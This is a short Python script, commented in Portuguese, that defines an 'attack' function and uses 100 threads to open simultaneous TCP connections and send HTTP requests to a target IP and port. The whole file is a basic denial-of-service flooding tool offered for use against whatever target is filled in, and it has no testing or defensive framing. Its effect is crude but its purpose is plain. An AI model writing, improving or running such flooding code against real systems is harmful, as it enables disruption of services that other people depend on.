import socket
import threading

# Endereço IP e porta do alvo
target_ip = "192.168.1.1"  # Substitua pelo IP de destino
target_port = 80           # Porta de destino (ex: HTTP)

# Função que cria um socket e envia pacotes para o alvo
def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP socket
    try:
        client.connect((target_ip, target_port))
        client.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))  # Envia dados simples
        client.sendto(b"Host: example.com\r\n\r\n", (target_ip, target_port))
        client.close()
    except socket.error as e:
        print(f"Erro de conexão: {e}")

# Criar múltiplas threads para simular várias conexões simultâneas
threads = []
for i in range(100):  # Número de threads para enviar múltiplas requisições
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Aguardar que todas as threads terminem
for t in threads:
    t.join()
